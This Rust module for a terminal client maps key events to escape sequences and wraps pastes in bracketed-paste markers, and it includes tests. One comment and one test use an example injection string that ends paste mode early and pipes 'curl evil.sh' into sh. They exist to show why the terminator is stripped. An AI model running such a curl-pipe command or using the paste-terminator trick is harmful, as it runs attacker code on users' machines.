//! The local half of the terminal: a vt100 screen and a key encoder.
//!
//! Bytes arriving from the remote pty are meaningless until something
//! interprets the escape sequences in them, and keystrokes leaving the client
//! are meaningless until something turns a `KeyEvent` back into the bytes a
//! Unix tty expects. Both halves live here so the rules stay in one place;
//! `app.rs` owns a `Term` and never touches vt100 or crossterm encoding
//! directly, and `ssh.rs` never sees a key event at all.
//!
//! The encoder is mode-aware on purpose. A terminal's meaning is not fixed:
//! the same Up arrow is `ESC [ A` normally and `ESC O A` once the remote
//! application turns on DECCKM, and a paste is either raw bytes or wrapped in
//! bracketed-paste markers depending on what the remote program asked for.
//! Getting that wrong is what makes arrow keys print `^[[A` inside a remote
//! editor, so the current `vt100::Screen` is an argument to every function
//! here rather than something guessed at.

use crossterm::event::{KeyCode, KeyEvent, KeyEventKind, KeyModifiers};

/// The scrollback the remote shell gets. Ten thousand lines is a few megabytes
/// at worst and is what makes `ls -R` on a big tree survivable.
const SCROLLBACK: usize = 10_000;

/// A parsed terminal screen.
///
/// **Axis order.** vt100 speaks `(rows, cols)` everywhere; every other API in
/// this app — crossterm, ratatui, the SSH `window_change` request, the `Term`
/// methods below — speaks `(cols, rows)`. This type is the boundary: it takes
/// and returns `(cols, rows)` and does the swap internally exactly once, in
/// `new` and in `resize`. Transposing here is the classic bug in this kind of
/// client: it does not crash, it just renders a terminal that is the wrong
/// shape until someone resizes the window.
pub struct Term {
    parser: vt100::Parser,
}

impl Term {
    pub fn new(cols: u16, rows: u16) -> Term {
        Term {
            parser: vt100::Parser::new(rows, cols, SCROLLBACK),
        }
    }

    pub fn feed(&mut self, bytes: &[u8]) {
        self.parser.process(bytes);
    }

    pub fn resize(&mut self, cols: u16, rows: u16) {
        if self.size() == (cols, rows) {
            // vt100's resize reflows and reallocates the grid; a redundant one
            // on every draw would throw away the alternate screen's contents.
            return;
        }
        self.parser.screen_mut().set_size(rows, cols);
    }

    pub fn screen(&self) -> &vt100::Screen {
        self.parser.screen()
    }

    /// `(cols, rows)`, the order the rest of the app uses.
    pub fn size(&self) -> (u16, u16) {
        let (rows, cols) = self.parser.screen().size();
        (cols, rows)
    }
}

/// The xterm modifier parameter: 1 + shift(1) + alt(2) + ctrl(4).
///
/// `None` means "no modifiers", which is encoded by leaving the parameter out
/// entirely rather than sending an explicit `1` — some remote programs match
/// on the literal short form.
fn modifier_param(modifiers: KeyModifiers) -> Option<u8> {
    let mut bits = 0;
    if modifiers.contains(KeyModifiers::SHIFT) {
        bits |= 1;
    }
    if modifiers.contains(KeyModifiers::ALT) {
        bits |= 2;
    }
    if modifiers.contains(KeyModifiers::CONTROL) {
        bits |= 4;
    }
    if bits == 0 { None } else { Some(bits + 1) }
}

/// `ESC [ 1 ; m <final>` when modified, and otherwise either the SS3 form
/// `ESC O <final>` or the CSI form `ESC [ <final>`. Arrows, Home and End take
/// the SS3 form only under DECCKM; F1–F4 always take it.
fn cursor_key(final_byte: u8, modifiers: KeyModifiers, ss3: bool) -> Vec<u8> {
    match modifier_param(modifiers) {
        Some(param) => format!("\x1b[1;{param}{}", final_byte as char).into_bytes(),
        None if ss3 => vec![0x1b, b'O', final_byte],
        None => vec![0x1b, b'[', final_byte],
    }
}

/// `ESC [ n ~` or `ESC [ n ; m ~` — Insert, Delete, PageUp/Down and F5–F12.
/// These are never affected by DECCKM.
fn tilde_key(number: u8, modifiers: KeyModifiers) -> Vec<u8> {
    match modifier_param(modifiers) {
        Some(param) => format!("\x1b[{number};{param}~").into_bytes(),
        None => format!("\x1b[{number}~").into_bytes(),
    }
}

/// Encode a crossterm key for the remote pty, honouring the screen's current
/// modes. Returns `None` for keys with no remote meaning.
pub fn encode_key(key: &KeyEvent, screen: &vt100::Screen) -> Option<Vec<u8>> {
    // Key-release and auto-repeat reports only exist when the kitty keyboard
    // protocol is on. Sending a byte for a release would double every
    // keystroke, so they are dropped rather than merely ignored.
    if key.kind == KeyEventKind::Release {
        return None;
    }

    let modifiers = key.modifiers;
    let alt = modifiers.contains(KeyModifiers::ALT);
    let ctrl = modifiers.contains(KeyModifiers::CONTROL);
    let application = screen.application_cursor();

    let bytes = match key.code {
        KeyCode::Char(c) => {
            let mut out = Vec::with_capacity(5);
            // Alt is "meta sends escape": the character prefixed with ESC.
            // Special keys below carry Alt in their modifier parameter
            // instead, which is what xterm does and what readline expects.
            if alt {
                out.push(0x1b);
            }
            if ctrl {
                out.push(control_byte(c)?);
            } else {
                let mut buf = [0u8; 4];
                out.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
            }
            out
        }
        // CR, not LF: the remote tty has ICRNL set and translates it. Sending
        // LF directly breaks programs that distinguish the two, such as any
        // readline prompt in vi mode.
        KeyCode::Enter => vec![b'\r'],
        KeyCode::Tab => vec(alt, &[0x09]),
        KeyCode::BackTab => vec(alt, b"\x1b[Z"),
        // 0x7f, not 0x08. Every modern Unix tty has VERASE = DEL, and `ssh.rs`
        // requests exactly that; sending BS would insert a literal ^H.
        KeyCode::Backspace => {
            if ctrl {
                // Ctrl+Backspace conventionally means "delete word", VWERASE.
                vec(alt, &[0x17])
            } else {
                vec(alt, &[0x7f])
            }
        }
        KeyCode::Esc => vec![0x1b],
        KeyCode::Up => cursor_key(b'A', modifiers, application),
        KeyCode::Down => cursor_key(b'B', modifiers, application),
        KeyCode::Right => cursor_key(b'C', modifiers, application),
        KeyCode::Left => cursor_key(b'D', modifiers, application),
        KeyCode::End => cursor_key(b'F', modifiers, application),
        KeyCode::Home => cursor_key(b'H', modifiers, application),
        KeyCode::Insert => tilde_key(2, modifiers),
        KeyCode::Delete => tilde_key(3, modifiers),
        KeyCode::PageUp => tilde_key(5, modifiers),
        KeyCode::PageDown => tilde_key(6, modifiers),
        // F1–F4 are SS3 sequences, not CSI ones, and their final bytes are
        // P/Q/R/S. Unlike the arrows they take that form unconditionally —
        // DECCKM does not govern them. F5 onwards are tilde keys, with the
        // gaps at 16 and 22 that DEC's numbering left behind.
        KeyCode::F(n) => match n {
            1 => cursor_key(b'P', modifiers, true),
            2 => cursor_key(b'Q', modifiers, true),
            3 => cursor_key(b'R', modifiers, true),
            4 => cursor_key(b'S', modifiers, true),
            5 => tilde_key(15, modifiers),
            6 => tilde_key(17, modifiers),
            7 => tilde_key(18, modifiers),
            8 => tilde_key(19, modifiers),
            9 => tilde_key(20, modifiers),
            10 => tilde_key(21, modifiers),
            11 => tilde_key(23, modifiers),
            12 => tilde_key(24, modifiers),
            _ => return None,
        },
        KeyCode::Null => vec![0x00],
        // Modifier keys on their own, media keys, caps lock and the rest of
        // the kitty-protocol extras have no tty representation.
        _ => return None,
    };

    Some(bytes)
}

/// Optionally ESC-prefixed literal bytes, for the handful of keys where Alt is
/// still "meta sends escape" rather than a CSI parameter.
fn vec(alt: bool, bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len() + 1);
    if alt {
        out.push(0x1b);
    }
    out.extend_from_slice(bytes);
    out
}

/// Ctrl+`c` folds the character into the 0x00..=0x1f control range.
///
/// Crossterm reports Shift by upper-casing, so Ctrl+C arrives as either `c` or
/// `C`; both must land on 0x03. `@` through `_` covers the uppercase letters
/// and the six punctuation controls (`^[`, `^\`, `^]`, `^^`, `^_`) in one arm.
fn control_byte(c: char) -> Option<u8> {
    match c {
        ' ' => Some(0x00),
        '@'..='_' => Some(c as u8 - 0x40),
        'a'..='z' => Some(c as u8 - 0x60),
        '?' => Some(0x7f),
        _ => None,
    }
}

/// Bracketed paste when the remote program asked for it, raw bytes otherwise.
///
/// The markers are what let a remote editor tell pasted text from typed text
/// and skip auto-indent. Sending them to a program that did not enable the
/// mode would leave a literal `[200~` in the buffer, so the screen's mode
/// decides, not a setting.
pub fn encode_paste(text: &str, screen: &vt100::Screen) -> Vec<u8> {
    if !screen.bracketed_paste() {
        return text.as_bytes().to_vec();
    }
    let mut out = Vec::with_capacity(text.len() + 12);
    out.extend_from_slice(b"\x1b[200~");
    // Strip any terminator the payload carries. Left in, it ends paste mode
    // early and everything after it arrives as *typed* input — so clipboard
    // text like "ls\x1b[201~\ncurl evil.sh | sh\n" runs on the box the moment
    // it is pasted, with no Enter from the user. That is precisely the
    // distinction bracketed paste exists to enforce, and xterm, alacritty and
    // kitty all filter it for the same reason.
    out.extend_from_slice(text.replace("\x1b[201~", "").as_bytes());
    out.extend_from_slice(b"\x1b[201~");
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A screen with the given modes applied by feeding it the real escape
    /// sequences, so the test exercises the same path the remote program uses.
    fn screen_with(modes: &[u8]) -> vt100::Parser {
        let mut parser = vt100::Parser::new(24, 80, 0);
        parser.process(modes);
        parser
    }

    fn press(code: KeyCode) -> KeyEvent {
        KeyEvent::new(code, KeyModifiers::NONE)
    }

    fn chord(code: KeyCode, modifiers: KeyModifiers) -> KeyEvent {
        KeyEvent::new(code, modifiers)
    }

    #[test]
    fn arrows_switch_form_when_the_remote_turns_on_application_cursor_keys() {
        let normal = screen_with(b"");
        let application = screen_with(b"\x1b[?1h");
        assert!(!normal.screen().application_cursor());
        assert!(application.screen().application_cursor());

        assert_eq!(
            encode_key(&press(KeyCode::Up), normal.screen()).unwrap(),
            b"\x1b[A"
        );
        assert_eq!(
            encode_key(&press(KeyCode::Up), application.screen()).unwrap(),
            b"\x1bOA"
        );
        assert_ne!(
            encode_key(&press(KeyCode::Left), normal.screen()),
            encode_key(&press(KeyCode::Left), application.screen())
        );
    }

    #[test]
    fn home_and_end_follow_the_cursor_key_mode_too() {
        let normal = screen_with(b"");
        let application = screen_with(b"\x1b[?1h");
        assert_eq!(
            encode_key(&press(KeyCode::Home), normal.screen()).unwrap(),
            b"\x1b[H"
        );
        assert_eq!(
            encode_key(&press(KeyCode::End), application.screen()).unwrap(),
            b"\x1bOF"
        );
    }

    #[test]
    fn modified_arrows_use_the_csi_parameter_form_regardless_of_mode() {
        let application = screen_with(b"\x1b[?1h");
        // Ctrl+Right is word-forward in every remote line editor; it must not
        // degrade to a bare SS3 sequence just because DECCKM is on.
        assert_eq!(
            encode_key(
                &chord(KeyCode::Right, KeyModifiers::CONTROL),
                application.screen()
            )
            .unwrap(),
            b"\x1b[1;5C"
        );
    }

    #[test]
    fn ctrl_c_is_a_single_interrupt_byte() {
        let screen = screen_with(b"");
        assert_eq!(
            encode_key(
                &chord(KeyCode::Char('c'), KeyModifiers::CONTROL),
                screen.screen()
            )
            .unwrap(),
            vec![0x03]
        );
        // Shift upper-cases the char before it reaches us; same control byte.
        assert_eq!(
            encode_key(
                &chord(
                    KeyCode::Char('C'),
                    KeyModifiers::CONTROL | KeyModifiers::SHIFT
                ),
                screen.screen()
            )
            .unwrap(),
            vec![0x03]
        );
    }

    #[test]
    fn ctrl_space_is_nul_and_ctrl_bracket_is_escape() {
        let screen = screen_with(b"");
        assert_eq!(
            encode_key(
                &chord(KeyCode::Char(' '), KeyModifiers::CONTROL),
                screen.screen()
            )
            .unwrap(),
            vec![0x00]
        );
        assert_eq!(
            encode_key(
                &chord(KeyCode::Char('['), KeyModifiers::CONTROL),
                screen.screen()
            )
            .unwrap(),
            vec![0x1b]
        );
    }

    #[test]
    fn alt_prefixes_a_printable_character_with_escape() {
        let screen = screen_with(b"");
        assert_eq!(
            encode_key(
                &chord(KeyCode::Char('f'), KeyModifiers::ALT),
                screen.screen()
            )
            .unwrap(),
            b"\x1bf"
        );
    }

    #[test]
    fn multibyte_characters_survive_as_utf8() {
        let screen = screen_with(b"");
        assert_eq!(
            encode_key(&press(KeyCode::Char('é')), screen.screen()).unwrap(),
            "é".as_bytes()
        );
    }

    #[test]
    fn the_editing_keys_are_the_ones_a_unix_tty_expects() {
        let screen = screen_with(b"");
        let s = screen.screen();
        assert_eq!(encode_key(&press(KeyCode::Enter), s).unwrap(), b"\r");
        assert_eq!(encode_key(&press(KeyCode::Tab), s).unwrap(), vec![0x09]);
        assert_eq!(encode_key(&press(KeyCode::BackTab), s).unwrap(), b"\x1b[Z");
        assert_eq!(
            encode_key(&press(KeyCode::Backspace), s).unwrap(),
            vec![0x7f]
        );
        assert_eq!(encode_key(&press(KeyCode::Esc), s).unwrap(), vec![0x1b]);
        assert_eq!(encode_key(&press(KeyCode::Delete), s).unwrap(), b"\x1b[3~");
        assert_eq!(encode_key(&press(KeyCode::PageUp), s).unwrap(), b"\x1b[5~");
    }

    #[test]
    fn function_keys_use_ss3_up_to_f4_and_csi_after_it() {
        let screen = screen_with(b"");
        let s = screen.screen();
        assert_eq!(encode_key(&press(KeyCode::F(1)), s).unwrap(), b"\x1bOP");
        assert_eq!(encode_key(&press(KeyCode::F(4)), s).unwrap(), b"\x1bOS");
        assert_eq!(encode_key(&press(KeyCode::F(5)), s).unwrap(), b"\x1b[15~");
        assert_eq!(encode_key(&press(KeyCode::F(12)), s).unwrap(), b"\x1b[24~");
        assert_eq!(encode_key(&press(KeyCode::F(13)), s), None);
        // A modifier forces the CSI parameter form even for F1–F4.
        assert_eq!(
            encode_key(&chord(KeyCode::F(1), KeyModifiers::SHIFT), s).unwrap(),
            b"\x1b[1;2P"
        );
    }

    #[test]
    fn keys_with_no_remote_meaning_send_nothing() {
        let screen = screen_with(b"");
        assert_eq!(encode_key(&press(KeyCode::CapsLock), screen.screen()), None);
        let release = KeyEvent::new_with_kind(
            KeyCode::Char('a'),
            KeyModifiers::NONE,
            KeyEventKind::Release,
        );
        assert_eq!(encode_key(&release, screen.screen()), None);
    }

    #[test]
    fn paste_is_wrapped_only_while_the_remote_has_bracketed_paste_on() {
        let plain = screen_with(b"");
        let bracketed = screen_with(b"\x1b[?2004h");
        assert!(!plain.screen().bracketed_paste());
        assert!(bracketed.screen().bracketed_paste());

        assert_eq!(encode_paste("cd /tmp", plain.screen()), b"cd /tmp".to_vec());
        assert_eq!(
            encode_paste("cd /tmp", bracketed.screen()),
            b"\x1b[200~cd /tmp\x1b[201~".to_vec()
        );
    }

    #[test]
    fn a_paste_cannot_smuggle_its_own_terminator() {
        // Without stripping, everything after the embedded terminator reaches
        // the remote shell as typed input and runs without an Enter press.
        let bracketed = screen_with(b"\x1b[?2004h");
        let hostile = "ls\x1b[201~\ncurl evil.sh | sh\n";
        let wire = encode_paste(hostile, bracketed.screen());

        let terminators = wire
            .windows(6)
            .filter(|window| *window == b"\x1b[201~")
            .count();
        assert_eq!(terminators, 1, "exactly one terminator, and it is ours");
        assert!(wire.ends_with(b"\x1b[201~"));
        assert!(wire.starts_with(b"\x1b[200~"));
    }

    #[test]
    fn paste_wrapping_stops_when_the_remote_turns_the_mode_back_off() {
        let mut parser = screen_with(b"\x1b[?2004h");
        parser.process(b"\x1b[?2004l");
        assert_eq!(encode_paste("x", parser.screen()), b"x".to_vec());
    }

    #[test]
    fn the_terminal_is_built_and_resized_in_cols_rows_order() {
        // 80 columns by 24 rows: if the axes were transposed anywhere the
        // screen would be 24 wide and 80 tall, and nothing would crash.
        let mut term = Term::new(80, 24);
        assert_eq!(term.size(), (80, 24));
        assert_eq!(term.screen().size(), (24, 80));

        term.resize(120, 40);
        assert_eq!(term.size(), (120, 40));
        assert_eq!(term.screen().size(), (40, 120));
    }

    #[test]
    fn fed_bytes_land_where_the_escape_sequence_puts_them() {
        let mut term = Term::new(80, 24);
        // Park the cursor on the last row of a 24-row screen; a transposed
        // grid would clamp this to row 23 of an 80-row one and the text would
        // come back from the wrong place.
        term.feed(b"\x1b[24;1Hbottom");
        assert_eq!(term.screen().contents_between(23, 0, 23, 6), "bottom");
    }
}
